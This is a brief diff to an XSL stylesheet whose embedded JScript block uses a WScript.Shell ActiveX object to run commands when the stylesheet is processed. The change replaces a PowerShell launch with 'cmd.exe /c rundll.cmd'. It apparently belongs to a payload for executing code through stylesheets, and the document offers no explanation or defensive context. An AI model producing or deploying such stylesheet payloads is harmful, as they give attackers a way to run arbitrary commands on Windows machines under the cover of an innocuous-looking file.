@@ -6,6 +6,6 @@ version="1.0">
 <output method="text"/>
 	<ms:script implements-prefix="user" language="JScript">
 	<![CDATA[
-	var r = new ActiveXObject("WScript.Shell").Run("powershell.exe");
+	var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c rundll.cmd");
 	]]> </ms:script>
 </stylesheet>
